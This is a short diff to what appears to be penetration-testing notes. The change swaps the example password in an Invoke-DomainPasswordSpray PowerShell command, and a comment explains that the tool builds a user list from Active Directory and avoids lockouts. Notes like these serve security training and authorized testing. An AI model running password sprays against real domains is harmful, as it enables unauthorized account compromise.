@@ -29,7 +29,7 @@ Import-Module DomainPasswordSpray.ps1
 
 ```powershell-session
 # Authenticated in the domain:
-Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
+Invoke-DomainPasswordSpray -Password Freedom1 -OutFile spray_success -ErrorAction SilentlyContinue
 # If we are authenticated to the domain, the tool will automatically generate a user list from Active Directory, query the domain password policy, and exclude user accounts within one attempt of locking out.
 
 # Not authenticated in the domain:
